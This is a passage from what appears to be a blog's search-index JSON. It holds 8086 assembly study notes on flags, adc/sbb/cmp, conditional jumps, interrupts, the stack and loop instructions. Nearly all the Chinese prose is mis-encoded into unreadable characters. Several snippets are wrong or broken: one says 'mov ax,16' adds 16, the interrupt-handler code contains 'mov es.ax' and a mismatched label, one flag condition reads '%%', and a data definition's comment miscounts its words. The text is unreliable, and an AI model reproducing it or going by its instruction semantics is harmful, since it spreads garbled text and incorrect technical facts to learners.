å€Ÿä½æ—¶ä¹Ÿä¼šå‘ç”Ÿæ”¹å˜ã€‚ OFï¼ˆæº¢å‡ºæ ‡å¿—ä½ï¼‰ï¼šåœ¨è¿›è¡Œæœ‰ç¬¦å·æ•°è¿ç®—æ—¶ï¼Œè‹¥è¿ç®—ç»“æœè¶…å‡ºæœºå™¨æ‰€èƒ½è¡¨è¾¾çš„èŒƒå›´ï¼Œå°†äº§ç”Ÿæº¢å‡ºã€‚äº§ç”Ÿæº¢å‡ºçš„æº¢å‡ºæ”¾å…¥OFã€‚ ","date":"2020-10-01","objectID":"/assembly-2/:4:1","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#1zfpfsfcfof"},{"categories":["Pwning"],"content":"2ã€adcã€sbbã€cmp adc ax,bx ;(ax)=(ax)+(bx)+CF ;ä¾‹è®¡ç®—1EF000H+201000H mov ax,001eh ;å­˜ä½ä½ mov bx,0f000h ;å­˜é«˜ä½ add bx,1000h ;ä½ä½ç›¸åŠ  adc ax,0020h sbb ax,bx ;(ax)=(ax)-(bx)-CF ;ä¾‹è®¡ç®—003E1000H-00202000H mov bx,1000h ;å­˜ä½ä½ mov ax,003eh ;å­˜é«˜ä½ sub bx,2000h ;ä½ä½ç›¸å‡ sbb ax,0020h cmp ax,bx ;(ax)-(bx)ï¼Œç”¨æ¥å½±å“flagå„ä½çš„å€¼ã€‚ ;æ— ç¬¦å·æ•°çš„æ¯”è¾ƒ ;(ax)=(bx),ZF=1; ;(ax)â‰ (bx),ZF=0; ;(ax)\u003c(bx),CF=1; ;(ax)â‰¥(bx),CF=0; ;(ax)\u003e(bx),CF=0\u0026\u0026ZF=0; ;(ax)â‰¤(bx),CF=1||ZF=1; ;æœ‰ç¬¦å·æ•°çš„æ¯”è¾ƒ ;SF=1\u0026\u0026OF=0,(ax)\u003c(bx) ;SF=1%%OF=1,(ax)\u003e(bx) ;SF=0\u0026\u0026OF=1,(ax)\u003c(bx) ;SF=0\u0026\u0026OF=0,(ax)â‰¥(bx) ","date":"2020-10-01","objectID":"/assembly-2/:4:2","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#2adcsbbcmp"},{"categories":["Pwning"],"content":"3ã€æ¡ä»¶è½¬ç§»æŒ‡ä»¤jump,not,equal,below,above æŒ‡ä»¤ å«ä¹‰ æ£€æµ‹çš„flag je ç­‰äºåˆ™è½¬ç§» ZF=1 jne ä¸ç­‰äºåˆ™è½¬ç§» ZF=0 jb ä½äºåˆ™è½¬ç§» CF=1 jnb ä¸ä½äºåˆ™è½¬ç§» CF=0 ja é«˜äºåˆ™è½¬ç§» CF=0,ZF=0 jna ä¸é«˜äºåˆ™è½¬ç§» CF=1 or ZF=1 ","date":"2020-10-01","objectID":"/assembly-2/:4:3","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#3æ¡ä»¶è½¬ç§»æŒ‡ä»¤"},{"categories":["Pwning"],"content":"4ã€DFå’Œä¸²ä¼ é€æŒ‡ä»¤DFï¼ˆæ–¹å‘æ ‡å¿—ä½ï¼‰ movsb ;(1)((es)*16+(di))=((ds)*16+(si)) ;(2)if df=0,(si)=(si)+1,(di)=(di)+1 ; if df=1,(si)=(si)-1,(di)=(di)-1 movsw ;(1)((es)*16+(di))=((ds)*16+(si)) ;(2)if df=0,(si)=(si)+2,(di)=(di)+2 ; if df=1,(si)=(si)-2,(di)=(di)-2 rep movsb ;s:movsb ; loop s cld ;è®¾ç½®df=0ï¼Œæ­£å‘ä¼ é€ std ;è®¾ç½®df=1 ","date":"2020-10-01","objectID":"/assembly-2/:4:4","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#4dfå’Œä¸²ä¼ é€æŒ‡ä»¤"},{"categories":["Pwning"],"content":"5ã€pushfå’Œpopfpushfï¼šå°†æ ‡å¿—å¯„å­˜å™¨çš„å€¼å‹æ ˆã€‚ popfï¼šå°†æ ˆä¸­çš„æ•°æ®å¼¹å‡ºï¼Œé€å…¥æ ‡å¿—å¯„å­˜å™¨ã€‚ ","date":"2020-10-01","objectID":"/assembly-2/:4:5","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#5pushfå’Œpopf"},{"categories":["Pwning"],"content":"12ã€å†…ä¸­æ–­ äº§ç”Ÿä¸­æ–­ä¿¡æ¯çš„å››ç§æƒ…å†µï¼š ï¼ˆ1ï¼‰é™¤æ³•é”™è¯¯ï¼Œå¦‚ï¼šdivæŒ‡ä»¤äº§ç”Ÿçš„é™¤æ³•æº¢å‡ºï¼› 0å·ä¸­æ–­ ï¼ˆ2ï¼‰å•æ­¥æ‰§è¡Œï¼› 1å·ä¸­æ–­ ï¼ˆ3ï¼‰æ‰§è¡ŒintoæŒ‡ä»¤ï¼› ï¼ˆ4ï¼‰æ‰§è¡ŒintæŒ‡ä»¤ã€‚ ","date":"2020-10-01","objectID":"/assembly-2/:5:0","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#12å†…ä¸­æ–­"},{"categories":["Pwning"],"content":"1ã€ä¸­æ–­å‘é‡è¡¨å‚¨å­˜ç€ä¸­æ–­å¤„ç†ç¨‹åºçš„å…¥å£åœ°å€çš„åˆ—è¡¨ï¼Œåœ¨å†…å­˜0000ï¼š0000åˆ°0000ï¼š03FFçš„1024ä¸ªå•å…ƒå­˜æ”¾ï¼Œä¸€ä¸ªç‰©ç†åœ°å€å å››ä¸ªå­—èŠ‚ï¼Œä½ä½ä¸ºipï¼Œé«˜ä½ä¸ºcsã€‚ ","date":"2020-10-01","objectID":"/assembly-2/:5:1","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#1ä¸­æ–­å‘é‡è¡¨"},{"categories":["Pwning"],"content":"2ã€ä¸­æ–­å¤„ç†è¿‡ç¨‹ å–å¾—ä¸­æ–­ç±»å‹ç Nï¼› pushf TF=0ï¼ŒIF=0ï¼› push cs push ip ï¼ˆipï¼‰=(N *4)ï¼Œ(cs)=(N *4+2) å¼€å§‹è¿è¡Œä¸­æ–­å¤„ç†ç¨‹åºï¼ˆç”¨iretè¿”å›ï¼‰ ","date":"2020-10-01","objectID":"/assembly-2/:5:2","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#2ä¸­æ–­å¤„ç†è¿‡ç¨‹"},{"categories":["Pwning"],"content":"3ã€ç¼–ç¨‹å¤„ç†0å·ä¸­æ–­ assume cs:code code segment start: mov ax,0 ;ç›®æ ‡ç¨‹åºåœ°å€ mov es,ax mov di,200H mov ax,cs ;æºç¨‹åºåœ°å€ mov ds,ax mov si,offset do0 mov cx,offset do0end-offset do ;ä¼ è¾“ä»£ç çš„é•¿åº¦ cld ;æ­£å‘ä¼ è¾“ rep movsb ;ä¼ è¾“ mov ax,0 ;è®¾ç½®ä¸­æ–­å‘é‡è¡¨ï¼ŒæŒ‡å‘æˆ‘ä»¬è§„å®šçš„ç¨‹åºå…¥å£ mov es,ax mov word ptr es:[0*4],200h mov word ptr es:[0*4+2],0 mov ax,4c00h int 21h do: jmp short do0 db 'overflow!' ;ç”¨æ¥å­˜æ”¾â€˜overflowï¼â€™ do0: mov ax,cs ;å­—ç¬¦ä¸²çš„åœ°å€ mov ds,ax mov si,202h mov ax,0b800h ;å­—ç¬¦ä¸²è¦æ˜¾ç¤ºçš„ä½ç½® mov es.ax mov di,12*160+36*2 mov cx,9 s: mov al,[si] mov es:[di],al inc si add di,2 loop s mov ax,4c00h int 21h do0end: nop code ends end start ","date":"2020-10-01","objectID":"/assembly-2/:5:3","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#3ç¼–ç¨‹å¤„ç†0å·ä¸­æ–­"},{"categories":["Pwning"],"content":"4ã€å•æ­¥ä¸­æ–­è‹¥TF=1ï¼Œåˆ™ä¼šäº§ç”Ÿå•æ­¥ä¸­æ–­ã€‚ å–å¾—ä¸­æ–­ç±»å‹ç 1ï¼› æ ‡å¿—å¯„å­˜å™¨å…¥æ ˆï¼ŒTF=0,IF=0ï¼› CS,IPå…¥æ ˆ (IP)=(1 *4),(CS)=(1 *4+2) åœ¨Debugä¸­ï¼Œtå‘½ä»¤ä½¿TF=1ï¼Œè¿›å…¥å•æ­¥ä¸­æ–­ç¨‹åºï¼ŒTFåˆè¢«è®¾ç½®ä¸º0ï¼Œæ¥é˜²æ­¢å•æ­¥ä¸­æ–­å¾ªç¯å‘ç”Ÿã€‚ åœ¨æ‰§è¡Œå®Œå‘sså¯„å­˜å™¨ä¼ é€æ•°æ®çš„æŒ‡ä»¤åï¼ŒCPUä¸ä¼šå“åº”ä¸­æ–­ã€‚å› ä¸ºssï¼šspçš„è®¾ç½®è¦è¿ç»­å®Œæˆã€‚ mov ax,1000h mov ss,ax mov ax,0 ;è¿™ä¸€æ­¥ç›´æ¥è¢«å¿½ç•¥ mov sp,0 ","date":"2020-10-01","objectID":"/assembly-2/:5:4","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#4å•æ­¥ä¸­æ–­"},{"categories":["Pwning"],"content":"æ±‡ç¼–è¯­è¨€ï¼ˆ1ï¼‰ æ•™ç¨‹ä½¿ç”¨ç‹çˆ½è€å¸ˆçš„ã€Šæ±‡ç¼–è¯­è¨€ã€‹ï¼ˆç¬¬ä¸‰ç‰ˆï¼‰ï¼Œè¿™é‡Œä»…ä»…ä»‹ç»äº†32ä½å¤„ç†å™¨ï¼Œå»ºè®®å†é˜…è¯»è¿‘å‡ å¹´çš„æ•™ç¨‹å­¦ä¹ 64ä½å¤„ç†å™¨çš„ä¸€äº›ç»“æ„ä¸æŒ‡ä»¤ã€‚ å¦‚æœä½ æœ‰ä¸€äº›cæˆ–c++çš„è¯­è¨€åŸºç¡€ï¼Œåœ¨å­¦ä¹ æ±‡ç¼–æ—¶ä¼šæ›´åŠ æ·±åˆ»çš„ç†è§£æ•°ç»„ã€å†…å­˜ç­‰åŸºæœ¬æ¦‚å¿µï¼Œå…¶ä¸­ä¹Ÿæœ‰å¾ˆå¤šè§„å®šå¯¹åº”äº†ç°åœ¨çš„è®¡ç®—æœºä¸ºä»€ä¹ˆé‚£ä¹ˆè®¾ç½®ã€‚ æ€»ä¹‹ï¼Œå»ºè®®è®¤çœŸå­¦ä¹ ã€‚ ","date":"2020-10-01","objectID":"/assembly-1/:0:0","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#æ±‡ç¼–è¯­è¨€1"},{"categories":["Pwning"],"content":"1ã€åŸºç¡€çŸ¥è¯†å­˜å‚¨å•å…ƒçš„æ¦‚å¿µï¼ŒCPUå¯¹å­˜å‚¨å™¨çš„è¯»å†™ï¼Œåœ°å€æ€»çº¿ï¼Œæ•°æ®æ€»çº¿ï¼Œæ§åˆ¶æ€»çº¿ å†…å­˜åœ°å€ç©ºé—´ï¼ŒRAM,ROM ","date":"2020-10-01","objectID":"/assembly-1/:1:0","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#1åŸºç¡€çŸ¥è¯†"},{"categories":["Pwning"],"content":"2ã€å¯„å­˜å™¨","date":"2020-10-01","objectID":"/assembly-1/:2:0","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#2å¯„å­˜å™¨"},{"categories":["Pwning"],"content":"1ã€é€šç”¨å¯„å­˜å™¨AX,BX,CX,DXå­˜æ”¾ä¸€èˆ¬æ•°æ®çš„16ä½å¯„å­˜å™¨ï¼Œå¯åˆ†ä¸ºå…«ä½å¯„å­˜å™¨ä½¿ç”¨-H,-Lã€‚ ","date":"2020-10-01","objectID":"/assembly-1/:2:1","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#1é€šç”¨å¯„å­˜å™¨"},{"categories":["Pwning"],"content":"2ã€CPUç»™å‡ºç‰©ç†åœ°å€CPUå°†å†…å­˜åˆ†æ®µï¼ŒåŸºç¡€åœ°å€ï¼ˆæ®µåœ°å€Ã—16ï¼‰+åç§»åœ°å€=ç‰©ç†åœ°å€ ","date":"2020-10-01","objectID":"/assembly-1/:2:2","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#2cpuç»™å‡ºç‰©ç†åœ°å€"},{"categories":["Pwning"],"content":"3ã€æ®µå¯„å­˜å™¨CS,DS,SS,ESæ®µå¯„å­˜å™¨ï¼ŒCSä¸ºä»£ç æ®µå¯„å­˜å™¨ï¼ŒIPä¸ºæŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨ 1ã€ä»CSï¼šIPæŒ‡å‘çš„å†…å­˜å•å…ƒè¯»å–æŒ‡ä»¤ï¼Œè¯»å–çš„æŒ‡ä»¤è¿›å…¥æŒ‡ä»¤ç¼“å†²å™¨ï¼š 2ã€IP=IP+æ‰€è¯»å–æŒ‡ä»¤çš„é•¿åº¦ï¼Œä»è€ŒæŒ‡å‘ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼š 3ã€æ‰§è¡ŒæŒ‡ä»¤ã€‚è½¬åˆ°æ­¥éª¤1ï¼Œé‡å¤è¿™ä¸ªè¿‡ç¨‹ã€‚ ","date":"2020-10-01","objectID":"/assembly-1/:2:3","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#3æ®µå¯„å­˜å™¨"},{"categories":["Pwning"],"content":"4ã€å‡ ä¸ªæ±‡ç¼–æŒ‡ä»¤ mov ax,dx ;dxä¸­çš„å€¼æ”¾å…¥axä¸­ï¼Œdxä¸å˜ mov ax,16 ;axä¸­çš„å€¼+16 mov al,dh ;dhä¸­çš„å€¼æ”¾å…¥alä¸­ add ax,dx ;ax=ax+dx add ah,4 ;ah=ah+4 jmp 1000:3 ;cs=1000,ip=3ï¼Œjmpç”¨æ¥ä¿®æ”¹csï¼šipçš„å€¼ jmp bx ;ip=bx ","date":"2020-10-01","objectID":"/assembly-1/:2:4","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#4å‡ ä¸ªæ±‡ç¼–æŒ‡ä»¤"},{"categories":["Pwning"],"content":"5ã€å®éªŒ1æŸ¥çœ‹ã€ä¿®æ”¹CPUä¸­å¯„å­˜å™¨çš„å†…å®¹ï¼šRå‘½ä»¤ æŸ¥çœ‹å†…å­˜ä¸­çš„å†…å®¹ï¼šDå‘½ä»¤ ä¿®æ”¹å†…å­˜ä¸­çš„å†…å®¹ï¼šEå‘½ä»¤ å°†å†…å­˜ä¸­çš„å†…å®¹è§£é‡Šä¸ºæœºå™¨æŒ‡ä»¤å’Œå¯¹åº”çš„æ±‡ç¼–æŒ‡ä»¤ï¼šUå‘½ä»¤ æ‰§è¡ŒCS:IPæŒ‡å‘çš„å†…å­˜å•å…ƒå¤„çš„æŒ‡ä»¤ï¼šTå‘½ä»¤ ä»¥æ±‡ç¼–æŒ‡ä»¤çš„å½¢å¼å‘å†…å­˜ä¸­å†™å…¥æŒ‡ä»¤ï¼šAå‘½ä»¤3 ","date":"2020-10-01","objectID":"/assembly-1/:2:5","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#5å®éªŒ1"},{"categories":["Pwning"],"content":"3ã€å¯„å­˜å™¨ï¼ˆå†…å­˜è®¿é—®ï¼‰å­—å•å…ƒï¼šå­˜æ”¾ä¸€ä¸ªå­—å‹æ•°æ®ï¼ˆ16ä½ï¼‰çš„å†…å­˜å•å…ƒ ","date":"2020-10-01","objectID":"/assembly-1/:3:0","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#3å¯„å­˜å™¨å†…å­˜è®¿é—®"},{"categories":["Pwning"],"content":"1ã€DSå¯„å­˜å™¨ï¼šé€šå¸¸ç”¨æ¥å­˜æ”¾è¦è®¿é—®æ•°æ®çš„æ®µåœ°å€ã€‚ mov bx,1000H mov ds,bx ï¼›dsä¸æ”¯æŒç›´æ¥é€å…¥æ•°æ®ï¼Œæ‰€ä»¥ç”¨bxåšä¸­è½¬ã€‚ mov ax,[0] ï¼›å°†1000ï¼š0å†…å­˜å•å…ƒçš„å­—å‹æ•°æ®æ”¾å…¥ax ï¼›[Â·Â·Â·]è¡¨ç¤ºä¸€ä¸ªå†…å­˜å•å…ƒï¼Œ[]å…¶ä¸­çš„å€¼ä»£è¡¨åç§»åœ°å€ ï¼›[0]çš„æ®µåœ°å€ï¼Œç³»ç»Ÿè‡ªåŠ¨è®¿é—®ds ","date":"2020-10-01","objectID":"/assembly-1/:3:1","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#1dså¯„å­˜å™¨"},{"categories":["Pwning"],"content":"2ã€movï¼Œaddï¼Œsub sub ax,bx ;ax=ax-bx æ“ä½œ mov add sub å¯„å­˜å™¨ï¼Œæ•°æ® 1 1 1 å¯„å­˜å™¨ï¼Œå¯„å­˜å™¨ 1 1 1 å¯„å­˜å™¨ï¼Œå†…å­˜å•å…ƒ 1 1 1 å†…å­˜å•å…ƒï¼Œå¯„å­˜å™¨ 1 1 1 æ®µå¯„å­˜å™¨ï¼Œå¯„å­˜å™¨ 1 0 0 å¯„å­˜å™¨ï¼Œæ®µå¯„å­˜å™¨ 1 0 0 å†…å­˜å•å…ƒï¼Œæ®µå¯„å­˜å™¨ 1 0 0 ","date":"2020-10-01","objectID":"/assembly-1/:3:2","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#2movaddsub"},{"categories":["Pwning"],"content":"3ã€æ•°æ®æ®µä¸“é—¨ç”¨æ¥å­˜å‚¨æ•°æ®çš„ä¸€æ®µå†…å­˜ç©ºé—´ ","date":"2020-10-01","objectID":"/assembly-1/:3:3","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#3æ•°æ®æ®µ"},{"categories":["Pwning"],"content":"4ã€æ ˆ push ax ;å…¥æ ˆï¼Œå°†axä¸­çš„æ•°æ®æ”¾å…¥æ ˆ pop ax ;å‡ºæ ˆï¼Œå°†æ ˆé¡¶çš„æ•°æ®å–å‡ºåˆ°ax æ®µå¯„å­˜å™¨SSï¼šå­˜æ”¾æ ˆé¡¶çš„æ®µåœ°å€ï¼Œå¯„å­˜å™¨SPï¼šå­˜æ”¾æ ˆé¡¶çš„åç§»åœ°å€ã€‚ ä»»æ„æ—¶åˆ»SSï¼šSPæŒ‡å‘æ ˆé¡¶å…ƒç´ ã€‚æ ˆä¸ºç©ºæ—¶ï¼Œä¸å­˜åœ¨æ ˆé¡¶å…ƒç´ ã€‚ push axï¼š ï¼ˆ1ï¼‰ï¼šSP=SP-2ï¼Œæ ˆé¡¶æ›´æ–°ï¼› ï¼ˆ2ï¼‰ï¼šå°†axä¸­çš„æ•°æ®é€å…¥SSï¼šSPæŒ‡å‘çš„å†…å­˜å•å…ƒ pop ax: ï¼ˆ1ï¼‰ï¼šå°†æ ˆé¡¶çš„æ•°æ®å–å‡ºåˆ°axï¼›SP=SP+2 ï¼ˆ2ï¼‰ï¼šSP=SP+2ï¼Œæ ˆé¡¶æ›´æ–°ï¼› popï¼Œpushå¯ä»¥å¯¹å¯„å­˜å™¨ï¼Œæ®µå¯„å­˜å™¨ï¼Œå†…å­˜å•å…ƒè¿›è¡Œæ“ä½œã€‚ æ ˆé¡¶è¶…ç•Œé—®é¢˜ å‘ä¸Šï¼Œå‘ä¸‹æº¢å‡ºï¼Œé€ æˆå¯¹å…¶ä»–å†…å­˜å•å…ƒæ•°æ®çš„è¦†ç›–ï¼Œæš´éœ²ã€‚ ","date":"2020-10-01","objectID":"/assembly-1/:3:4","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#4æ ˆ"},{"categories":["Pwning"],"content":"4ã€ç¬¬ä¸€ä¸ªç¨‹åº","date":"2020-10-01","objectID":"/assembly-1/:4:0","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#4ç¬¬ä¸€ä¸ªç¨‹åº"},{"categories":["Pwning"],"content":"1ã€ä¸€äº›åŸºæœ¬æ¦‚å¿µç¨‹åºçš„æ‰§è¡Œè¿‡ç¨‹ï¼š ï¼ˆ1ï¼‰ç¼–å†™æ±‡ç¼–æºç¨‹åºï¼Œäº§ç”Ÿä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶(.asm)ã€‚ ï¼ˆ2ï¼‰å¯¹æºç¨‹åºè¿›è¡Œç¼–è¯‘è¿æ¥ï¼Œç¼–è¯‘äº§ç”Ÿç›®æ ‡æ–‡ä»¶(.obj)ï¼Œå°†ç›®æ ‡æ–‡ä»¶è¿›è¡Œè¿æ¥ï¼Œäº§ç”Ÿå¯æ‰§è¡Œæ–‡ä»¶ï¼ˆ.exeï¼‰ã€‚ ï¼ˆ3ï¼‰æ‰§è¡Œå¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„ç¨‹åºã€‚ ","date":"2020-10-01","objectID":"/assembly-1/:4:1","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#1ä¸€äº›åŸºæœ¬æ¦‚å¿µ"},{"categories":["Pwning"],"content":"2ã€ä¼ªæŒ‡ä»¤ä¼ªæŒ‡ä»¤ï¼Œç”±ç¼–è¯‘å™¨æ‰§è¡Œï¼Œæ±‡ç¼–æŒ‡ä»¤è¢«ç¼–è¯‘ä¸ºæœºå™¨ç ç”±CPUæ‰§è¡Œã€‚ assume cs:abc ;assumeå°†åä¸ºabcçš„ä»£ç æ®µä¸csè”ç³» abc segment ;æ®µçš„å¼€å§‹ mov ax,2 add ax,ax add ax,ax mov ax,4c00h ;è¿™ä¸¤å¥ä»£è¡¨ç¨‹åºè¿”å› int 21h ;intï¼ŒDebugä¸­ç”¨på‘½ä»¤æ‰§è¡Œ abc ends ;æ®µçš„ç»“æŸ end ;ç¨‹åºçš„ç»“æŸ ","date":"2020-10-01","objectID":"/assembly-1/:4:2","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#2ä¼ªæŒ‡ä»¤"},{"categories":["Pwning"],"content":"3ã€ç¨‹åºæ‰§è¡Œçš„è·Ÿè¸ªcommand.comè¿è¡Œåï¼Œå°†ç¨‹åº1.exeåŠ è½½å…¥å†…å­˜ï¼Œcommandè®¾ç½®CPUçš„CS:IPæŒ‡å‘ç¨‹åºçš„ç¬¬ä¸€æ¡æŒ‡ä»¤ï¼Œä¹‹åcommandå°†CPUçš„æ§åˆ¶æƒäº¤ç»™ç¨‹åºï¼Œç¨‹åºè¿è¡Œå®Œæˆåï¼Œè¿”å›åˆ°commandã€‚ CXå¯„å­˜å™¨å­˜æ”¾äº†ç¨‹åºé•¿åº¦ï¼ŒDS=SA,CS:IPæŒ‡å‘SA+10H:0 ç©ºé—²å†…å­˜åŒºï¼šSA:0 PSPåŒºï¼šSA:0 256ä¸ªå­—èŠ‚ ç¨‹åºåŒºï¼šSA+10H:0 ","date":"2020-10-01","objectID":"/assembly-1/:4:3","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#3ç¨‹åºæ‰§è¡Œçš„è·Ÿè¸ª"},{"categories":["Pwning"],"content":"5ã€[bx]å’ŒloopæŒ‡ä»¤","date":"2020-10-01","objectID":"/assembly-1/:5:0","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#5bxå’ŒloopæŒ‡ä»¤"},{"categories":["Pwning"],"content":"1ã€[bx]\u0026ä¸€äº›åŸºæœ¬æ¦‚å¿µï¼ˆ1ï¼‰[bx]ä»£è¡¨ä¸€ä¸ªå†…å­˜å•å…ƒï¼Œå…¶æ®µåœ°å€åœ¨dsä¸­ï¼Œåç§»åœ°å€åœ¨bxä¸­ã€‚ ï¼ˆ2ï¼‰loopä»£è¡¨å¾ªç¯ ï¼ˆ3ï¼‰â€œï¼ˆï¼‰â€æ¥è¡¨ç¤ºä¸€ä¸ªå¯„å­˜å™¨æˆ–ä¸€ä¸ªå†…å­˜å•å…ƒä¸­çš„å†…å®¹ ï¼ˆaxï¼‰ï¼ˆdsï¼‰ axï¼Œdsä¸­çš„å€¼ ï¼ˆ20000Hï¼‰ 20000å¤„å†…å­˜å•å…ƒçš„å€¼ ï¼ˆï¼ˆdsï¼‰*16+2ï¼‰ å†…å­˜å•å…ƒdsï¼š2å¤„çš„å€¼ ï¼ˆ4ï¼‰çº¦å®šç¬¦å·idataè¡¨ç¤ºå¸¸é‡ ","date":"2020-10-01","objectID":"/assembly-1/:5:1","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#1bxä¸€äº›åŸºæœ¬æ¦‚å¿µ"},{"categories":["Pwning"],"content":"2ã€loopæŒ‡ä»¤ mov cx,11 s: add ax,ax ï¼›sä¸ºæ ‡å·ï¼Œä»£è¡¨ä¸€æ®µåœ°å€ loop s ï¼›ï¼ˆcxï¼‰=ï¼ˆcxï¼‰-1ï¼Œè‹¥ï¼ˆcxï¼‰ä¸ä¸º0ï¼Œè·³è½¬è‡³så¤„æ‰§è¡Œï¼Œè‹¥ä¸º0ï¼Œå‘ä¸‹æ‰§è¡Œã€‚ åœ¨æ±‡ç¼–æºç¨‹åºä¸­ï¼Œæ•°æ®ä¸èƒ½ä»¥å­—æ¯å¼€å¤´ã€‚ åœ¨è°ƒè¯•æ—¶ï¼Œå¯ä»¥ç”¨gå‘½ä»¤è·³åˆ°ä¸‹ä¸€æ¡è¯­å¥ï¼Œä¹Ÿå¯ä»¥ç”¨på‘½ä»¤ã€‚ ","date":"2020-10-01","objectID":"/assembly-1/:5:2","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#2loopæŒ‡ä»¤"},{"categories":["Pwning"],"content":"3ã€Debugå’Œç¼–è¯‘å™¨å¯¹æŒ‡ä»¤çš„è§£é‡Šå¯¹äº[idata]Debugå°†å…¶è§£é‡Šä¸ºdsï¼šidataï¼Œè€Œç¼–è¯‘å™¨å°†å…¶è§£é‡Šä¸ºidataã€‚ ;å¯¹äºç¼–è¯‘å™¨ mov al,[0] ;(al)=0 mov al,ds:[0] ;(al)=((ds)*16+0) mov al,[bx] ;(al)=((ds)*16+(bx)) mov al,ds:[bx] ;åŒä¸Šï¼Œcsï¼Œdsï¼Œssï¼Œesç§°ä¸ºæ®µå‰ç¼€ ","date":"2020-10-01","objectID":"/assembly-1/:5:3","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#3debugå’Œç¼–è¯‘å™¨å¯¹æŒ‡ä»¤çš„è§£é‡Š"},{"categories":["Pwning"],"content":"4ã€ä¸€æ®µå®‰å…¨çš„ç©ºé—´ç›´æ¥å‘å†…å­˜ç©ºé—´ä¸­å†™å…¥æ•°æ®å¯èƒ½ä¼šå¯¹ç³»ç»Ÿé€ æˆæŸå®³ã€‚ PCæœºæä¾›äº†ä¸€æ®µå®‰å…¨çš„ç©ºé—´0ï¼š200~0ï¼š2ffï¼Œä¾›æˆ‘ä»¬ä½¿ç”¨ã€‚ ","date":"2020-10-01","objectID":"/assembly-1/:5:4","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#4ä¸€æ®µå®‰å…¨çš„ç©ºé—´"},{"categories":["Pwning"],"content":"6ã€åŒ…å«å¤šä¸ªæ®µçš„ç¨‹åº assume cs:code,ds:data,ss:stack data segment dw 0123h,0456h,0789h,0abch,0defh,0cbah,0987h ;dwâ€œdefine wordâ€ï¼Œå®šä¹‰äº†å…«ä¸ªå­—å‹æ•°æ® ;dwå®šä¹‰çš„æ•°æ®åœ¨æ•°æ®æ®µçš„æœ€å¼€å§‹,å³dsï¼š0ã€â€¦â€¦ã€dsï¼še data ends stack segment dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ;å°†è¿™16ä¸ªå­—çš„ç©ºé—´å½“ä½œæ ˆ stack ends code segment start: mov ax,stack mov ss,ax ;å‘Šè¯‰CPUï¼Œstackæ®µä¸ºæ ˆç©ºé—´ mov sp,20h ;æ ˆç©ºæ—¶çš„æ ˆé¡¶ mov ax,data mov ds,ax ;dataæ®µä½æ•°æ®æ®µ mov bx,0 ;bxå­˜æ”¾åç§»åœ°å€ mov cx,8 s: push [bx] add bx,2 loop s mov bx,0 mov cx,8 s0: pop [bx] add bx,2 loop s0 mov ax,4c00h int 21h code ends end start ;æŒ‡æ˜ç¨‹åºå…¥å£åœ¨startå¤„ ","date":"2020-10-01","objectID":"/assembly-1/:6:0","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#6åŒ…å«å¤šä¸ªæ®µçš„ç¨‹åº"},{"categories":["Pwning"],"content":"7ã€çµæ´»å®šä½å†…å­˜åœ°å€","date":"2020-10-01","objectID":"/assembly-1/:7:0","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#7çµæ´»å®šä½å†…å­˜åœ°å€"},{"categories":["Pwning"],"content":"1ã€andå’Œorandï¼šé€»è¾‘ä¸ï¼Œå¯ä»¥å°†æ“ä½œå¯¹è±¡çš„ç›¸åº”ä½è®¾ä¸º0ã€‚ orï¼šé€»è¾‘æˆ–ï¼Œå¯ä»¥å°†æ“ä½œå¯¹è±¡çš„ç›¸åº”ä½è®¾ä¸º1ã€‚ and al,11011111B ;å°å†™è½¬å¤§å†™ or bl,00100000B ;å¤§å†™è½¬å°å†™ db 'DoNg' ;å®šä¹‰å­—èŠ‚æ•°æ® ","date":"2020-10-01","objectID":"/assembly-1/:7:1","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#1andå’Œor"},{"categories":["Pwning"],"content":"2ã€[bx+idata]ä¸æ•°ç»„ç”¨idataè¡¨ç¤ºæ•°ç»„å¼€å§‹çš„ä½ç½®ï¼Œbxè¡¨ç¤ºæ•°ç»„çš„åç§»ã€‚ 